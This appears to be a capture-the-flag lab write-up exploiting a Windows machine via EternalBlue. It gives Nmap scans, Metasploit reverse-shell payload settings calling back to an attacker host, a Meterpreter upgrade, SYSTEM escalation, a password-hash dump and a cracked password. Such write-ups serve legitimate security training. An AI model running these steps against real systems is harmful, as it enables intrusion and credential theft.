### ðŸ”¹ Recon

We started by scanning the target machine with Nmap:

```
GOLDEN ONE LINER FOR RECON

nmap -sC -sV -p- -T4 10.201.9.60
```
```
-p- â†’ scans all 65,535 ports (you donâ€™t miss hidden services).
-sC â†’ runs default scripts (SMB, HTTP, RDP checks, etc.).
-sV â†’ grabs service versions.
-T4 â†’ speeds things up without being too noisy.
```
Pro tipâš¡:
For stealth (real-life pentesting) weâ€™d use slower scans (like -T2, -T1) and maybe avoid all-port scans right away.

This revealed open ports under 1000:

* 135/tcp (msrpc)
* 139/tcp (netbios-ssn)
* 445/tcp (microsoft-ds)
* 3389/tcp (tcpwrapped)

We checked for vulnerabilities using:

```
nmap --script vuln -p445 10.201.9.60
```

Result: Machine is vulnerable to `ms17-010` (EternalBlue).

---

### ðŸ”¹ Gain Access

We used Metasploit to exploit MS17-010:

```
search eternal
use 0
set RHOSTS 10.201.9.60
set payload windows/x64/shell/reverse_tcp
set LHOST <Kali_IP>
set LPORT 4445
run
```

* `/shell/reverse_tcp` gave a raw Windows CMD shell.
* To stabilize, we used Meterpreter payload instead:

```
set payload windows/x64/meterpreter/reverse_tcp
run
```

* This opened a Meterpreter session directly.
* If using a shell first, we can **upgrade manually**:

```
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST <Kali_IP>
set LPORT 5555
run
```

This successfully upgraded the shell to Meterpreter.

Key options in Metasploit:

* `RHOSTS` â†’ target IP
* `LHOST` â†’ Kali IP for reverse connection
* `LPORT` â†’ listening port
* `SESSION` â†’ session to upgrade (for shell\_to\_meterpreter)

---

### ðŸ”¹ Escalate

* Background the shell: `CTRL+Z`
* List sessions: `sessions -l`
* Upgrade raw shell to Meterpreter: `post/multi/manage/shell_to_meterpreter`
* Verify SYSTEM privileges:

```
getsystem
getuid
shell
whoami
```

* List processes: `ps`
* Find a process running as `NT AUTHORITY\SYSTEM` and migrate:

```
migrate <PID>
```

* This gives a stable Meterpreter session as SYSTEM.

---

### ðŸ”¹ Cracking

* Dump password hashes in Meterpreter:

```
hashdump
```

Output:

```
Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0
Jon:1000:...:ffb43f0de35be4d9917ac0cc8ad57f8d
```

* Non-default user: `Jon`
* Cracked hash using CrackStation: `ffb43f0de35be4d9917ac0cc8ad57f8d` â†’ password: `alqfna22`

---

### ðŸ”¹ Find Flags

1. **Flag 1** â€“ System root:

```
C:\ â†’ flag{access_the_machine}
```

2. **Flag 2** â€“ SAM database:

```
C:\Windows\System32\config\flag2.txt â†’ flag{sam_database_elevated_access}
```

3. **Flag 3** â€“ Administrator Documents:

```
C:\Users\Jon\Documents\flag3.txt â†’ flag{admin_documents_can_be_valuable}
```

* Navigated via `shell` and used `cd` / `dir` / `type <file>` to read flags.

---

### ðŸ”¹ Key Learnings

* Recon: Use `nmap -sC -sV -p-` to discover open ports and services.
* Vulnerability scanning: `nmap --script vuln` to detect MS17-010.
* Exploitation: Choice of payload matters (`shell` vs Meterpreter).
* Privilege escalation: Always aim for SYSTEM access.
* Post-exploitation: Meterpreter provides tools to dump hashes, navigate filesystem, and migrate to stable processes.
* Cracking: Hashes can be cracked using online tools or local cracking suites.
* Flag hunting: Understanding Windows directories and sensitive locations is crucial.

